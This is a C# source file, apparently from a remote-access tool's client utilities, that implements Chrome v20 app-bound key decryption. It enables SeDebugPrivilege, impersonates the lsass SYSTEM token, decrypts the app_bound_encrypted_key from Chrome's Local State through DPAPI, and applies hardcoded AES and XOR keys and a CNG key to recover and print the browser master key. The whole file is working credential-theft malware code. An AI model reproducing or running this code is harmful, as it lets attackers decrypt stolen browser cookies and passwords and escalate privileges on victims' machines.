using BCryptNs;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Markup;

namespace Comet.Client.Utilities
{
    public class V20Decode
    {
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool DuplicateTokenEx(
            IntPtr hExistingToken,
            uint dwDesiredAccess,
            IntPtr lpTokenAttributes,
            int ImpersonationLevel,
            int TokenType,
            out IntPtr phNewToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        static public extern bool RevertToSelf();

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges,
            ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

        const uint TOKEN_DUPLICATE = 0x0002;
        const uint TOKEN_QUERY = 0x0008;
        const uint TOKEN_IMPERSONATE = 0x0004;
        const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
        const string SE_DEBUG_NAME = "SeDebugPrivilege";
        const int SecurityImpersonation = 2;
        const int TokenImpersonation = 2;

        [StructLayout(LayoutKind.Sequential)]
        public struct LUID
        {
            public uint LowPart;
            public int HighPart;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct TOKEN_PRIVILEGES
        {
            public uint PrivilegeCount;
            public LUID Luid;
            public uint Attributes;
        }

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, ref LUID lpLuid);

        [DllImport("kernel32.dll")]
        public static extern uint GetLastError();

        [DllImport("crypt32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool CryptUnprotectData(
    ref DATA_BLOB pDataIn,
    StringBuilder szDataDescr,
    IntPtr pOptionalEntropy,
    IntPtr pvReserved,
    IntPtr pPromptStruct,
    int dwFlags,
    ref DATA_BLOB pDataOut);

        [StructLayout(LayoutKind.Sequential)]
        public struct DATA_BLOB
        {
            public int cbData;
            public IntPtr pbData;
        }



        [DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
        public static extern int NCryptOpenStorageProvider(
            out IntPtr phProvider,
            string pszProviderName,
            int dwFlags);

        [DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
        public static extern int NCryptOpenKey(
            IntPtr hProvider,
            out IntPtr phKey,
            string pszKeyName,
            int dwLegacyKeySpec,
            int dwFlags);

        [DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
        public static extern int NCryptDecrypt(
            IntPtr hKey,
            byte[] pbInput,
            int cbInput,
            IntPtr pPaddingInfo,
            byte[] pbOutput,
            int cbOutput,
            ref int pcbResult,
            uint dwFlags);

        [DllImport("ncrypt.dll")]
        public static extern int NCryptFreeObject(IntPtr hObject);
        //权限提升
        static public void EnableDebugPrivilege()
        {
            IntPtr hToken;
            OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken);

            LUID luid = new LUID();
            LookupPrivilegeValue(null, SE_DEBUG_NAME, ref luid);

            TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
            tp.PrivilegeCount = 1;
            tp.Luid = luid;
            tp.Attributes = 2; // SE_PRIVILEGE_ENABLED

            if (!AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero))
            {
                Console.WriteLine("AdjustTokenPrivileges failed!");
            }
            else
            {
                int lastErr = Marshal.GetLastWin32Error();
                if (lastErr == 1300)
                    Console.WriteLine("Not all privileges assigned! (ERROR_NOT_ALL_ASSIGNED)");
            }

            //寻找lsass进程
            Process lsassProc = null;
            foreach (var proc in Process.GetProcesses())
            {
                if (proc.ProcessName.ToLower() == "lsass")
                {
                    lsassProc = proc;
                    break;
                }
            }

            IntPtr lsassToken;
            if (!OpenProcessToken(lsassProc.Handle, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, out lsassToken))
            {
                Console.WriteLine("Failed to open lsass token.");
                return;
            }

            // 复制令牌
            IntPtr impersonationToken;
            if (!DuplicateTokenEx(lsassToken, 0xF01FF, IntPtr.Zero, SecurityImpersonation, TokenImpersonation, out impersonationToken))
            {
                Console.WriteLine("Failed to duplicate token.,ErrorCode:{0}", GetLastError());
                return;
            }

            // 在当前线程 impersonate 复制出的令牌
            if (!ImpersonateLoggedOnUser(impersonationToken))
            {
                Console.WriteLine("Failed to impersonate.,ErorCode:{0}", GetLastError());
                return;
            }
        }

        public static byte[] HexToBytes(string hex)
        {
            byte[] result = new byte[hex.Length / 2];
            for (int i = 0; i < result.Length; i++)
                result[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
            return result;
        }

        public static byte[] XorBytes(byte[] a, byte[] b)
        {
            if (a.Length != b.Length) throw new ArgumentException("Key lengths mismatch");
            byte[] r = new byte[a.Length];
            for (int i = 0; i < a.Length; i++)
                r[i] = (byte)(a[i] ^ b[i]);
            return r;
        }

        public static byte[] DecryptWithCng(byte[] inputData)
        {
            string ProviderName = "Microsoft Software Key Storage Provider";
            string KeyName = "Google Chromekey1";
            uint NCRYPT_SILENT_FLAG = 0x40;

            IntPtr hProvider = IntPtr.Zero;
            IntPtr hKey = IntPtr.Zero;

            int status = NCryptOpenStorageProvider(out hProvider, ProviderName, 0);
            if (status != 0) throw new Exception($"NCryptOpenStorageProvider failed: {status}");

            status = NCryptOpenKey(hProvider, out hKey, KeyName, 0, 0);
            if (status != 0) throw new Exception($"NCryptOpenKey failed: {status}");

            // First call to get output size
            int pcbResult = 0;
            status = NCryptDecrypt(
                hKey, inputData, inputData.Length,
                IntPtr.Zero, null, 0, ref pcbResult, NCRYPT_SILENT_FLAG);
            if (status != 0) throw new Exception($"1st NCryptDecrypt failed: {status}");

            // Second call to get actual output
            byte[] output = new byte[pcbResult];
            status = NCryptDecrypt(
                hKey, inputData, inputData.Length,
                IntPtr.Zero, output, output.Length, ref pcbResult, NCRYPT_SILENT_FLAG);
            if (status != 0) throw new Exception($"2nd NCryptDecrypt failed: {status}");

            NCryptFreeObject(hKey);
            NCryptFreeObject(hProvider);

            if (output.Length > pcbResult)
            {
                // Trim to result length
                byte[] result = new byte[pcbResult];
                Buffer.BlockCopy(output, 0, result, 0, pcbResult);
                return result;
            }
            else
            {
                return output;
            }
        }

        public static byte[] GetMasterKey2(string local_state_path)
        {
            string local_state_fileContent = File.ReadAllText(local_state_path);
            string strRegExPattern = "\"app_bound_encrypted_key\":\"(.*?)\"";
            Match match = Regex.Match(local_state_fileContent, strRegExPattern);
            string[] items = match.Value.Split(new string[] { "\"app_bound_encrypted_key\":" }, StringSplitOptions.None);

            string app_bound_encrypted_key_base64 = items[1].Trim('"');
            // 1. 先 base64 解码拿到原始加密二进制
            byte[] encrypted_whole_data = Convert.FromBase64String(app_bound_encrypted_key_base64);

            // 2. 确定 header
            // 如果头4字节是 "APPB"（ASCII），剩下是 DPAPI 密码 blob
            if (encrypted_whole_data.Length < 4
                || encrypted_whole_data[0] != (byte)'A'
                || encrypted_whole_data[1] != (byte)'P'
                || encrypted_whole_data[2] != (byte)'P'
                || encrypted_whole_data[3] != (byte)'B')
            {
                Console.WriteLine("Not APPB header, data may be corrupted or version mismatch.");
                return new byte[0];
            }

            // 3. Window DPAPI密文字节数组
            //    直接拿第5字节起剩下的全部
            int keyBlobLen = encrypted_whole_data.Length - 4;
            byte[] key_blob_encrypted = new byte[keyBlobLen];
            Buffer.BlockCopy(encrypted_whole_data, 4, key_blob_encrypted, 0, keyBlobLen);

            // --- enable privilege ---
            EnableDebugPrivilege();

            DATA_BLOB inputBlob = new DATA_BLOB();
            DATA_BLOB outputBlob = new DATA_BLOB();
            DATA_BLOB outputBlob2 = new DATA_BLOB();

            inputBlob.pbData = Marshal.AllocHGlobal(key_blob_encrypted.Length);
            inputBlob.cbData = key_blob_encrypted.Length;
            Marshal.Copy(key_blob_encrypted, 0, inputBlob.pbData, key_blob_encrypted.Length);

            //使用system token解密
            bool success = CryptUnprotectData(
                ref inputBlob,
                null,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                0,
                ref outputBlob
            );
            if (!success)
            {
                int error = Marshal.GetLastWin32Error();
                Console.WriteLine("CryptUnprotectData failed, error: 0x{0:x}", error);
                Environment.Exit(0);
            }

            //撤销令牌模拟
            RevertToSelf();

            //使用当前用户token解密
            success = CryptUnprotectData(
              ref outputBlob,
              null,
              IntPtr.Zero,
              IntPtr.Zero,
              IntPtr.Zero,
              0,
              ref outputBlob2
          );
            if (!success)
            {
                int error = Marshal.GetLastWin32Error();
                Console.WriteLine("CryptUnprotectData failed, error: 0x{0:x}", error);
                Environment.Exit(0);
            }

            byte[] key_blob_decrypted = new byte[outputBlob2.cbData];
            Marshal.Copy(outputBlob2.pbData, key_blob_decrypted, 0, outputBlob2.cbData);

            var parsed = BlobParser.Parse(key_blob_decrypted);

            Console.WriteLine(BitConverter.ToString(parsed.Header));
            Console.WriteLine($"Flag: {parsed.Flag}");
            Console.WriteLine($"Tag:{BitConverter.ToString(parsed.Tag)}");

            byte[] v20_master_key = DecryptBlob(parsed);
            Console.WriteLine($"AES KEY:{BitConverter.ToString(v20_master_key)}");
            return v20_master_key;
        }

        public static byte[] DecryptBlob(ParsedBlob parsed_data)
        {
            AesGcm aesDecryptor = new AesGcm();
            if (parsed_data.Flag == 1)
            {
                byte[] aesKey = HexToBytes("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787");
                return aesDecryptor.Decrypt(aesKey, parsed_data.Iv, null, parsed_data.Ciphertext, parsed_data.Tag);
            }
            else if (parsed_data.Flag == 2)
            {
                byte[] chacha20Key = HexToBytes("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660");
                // BouncyCastle 解密
                // ...参见上面的 ChaCha20-Poly1305代码
                // return output;
                throw new NotImplementedException("ChaCha20-Poly1305 C#实现可参考BouncyCastle");
            }
            else if (parsed_data.Flag == 3)
            {
                byte[] xorKey = HexToBytes("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390");
                EnableDebugPrivilege();
                byte[] decryptedAesKey = DecryptWithCng(parsed_data.EncryptedAesKey); // 需你自己实现
                byte[] xoredAesKey = XorBytes(decryptedAesKey, xorKey);
                return aesDecryptor.Decrypt(xoredAesKey, parsed_data.Iv, null, parsed_data.Ciphertext, parsed_data.Tag);
            }
            else
            {
                throw new NotSupportedException($"Unsupported flag: {parsed_data.Flag}");
            }
        }
    }
    public class ParsedBlob
    {
        public byte[] Header { get; set; }
        public byte[] Iv { get; set; }
        public byte[] Ciphertext { get; set; }
        public byte[] Tag { get; set; }
        public byte[] EncryptedAesKey { get; set; }
        public byte Flag { get; set; }
    }

    public static class BlobParser
    {
        public static ParsedBlob Parse(byte[] blobData)
        {
            using (var ms = new MemoryStream(blobData))
            using (var br = new BinaryReader(ms))
            {
                var result = new ParsedBlob();

                // Read header_len (4 bytes, little-endian)
                int headerLen = br.ReadInt32();

                // header区块
                result.Header = br.ReadBytes(headerLen);

                // Read content_len (4 bytes, little-endian)
                int contentLen = br.ReadInt32();

                // 校验长度
                if (headerLen + contentLen + 8 != blobData.Length)
                    throw new Exception("Length mismatch: headerLen + contentLen + 8 != blobData.Length");

                // flag (1 byte)
                result.Flag = br.ReadByte();

                if (result.Flag == 1 || result.Flag == 2)
                {
                    // [flag|iv|ciphertext|tag] -> [1byte|12bytes|32bytes|16bytes]
                    result.Iv = br.ReadBytes(12);
                    result.Ciphertext = br.ReadBytes(32);
                    result.Tag = br.ReadBytes(16);
                }
                else if (result.Flag == 3)
                {
                    // [flag|encrypted_aes_key|iv|ciphertext|tag] -> [1byte|32bytes|12bytes|32bytes|16bytes]
                    result.EncryptedAesKey = br.ReadBytes(32);
                    result.Iv = br.ReadBytes(12);
                    result.Ciphertext = br.ReadBytes(32);
                    result.Tag = br.ReadBytes(16);
                }
                else
                {
                    throw new Exception($"Unsupported flag: {result.Flag}");
                }

                return result;
            }
        }
    }
}
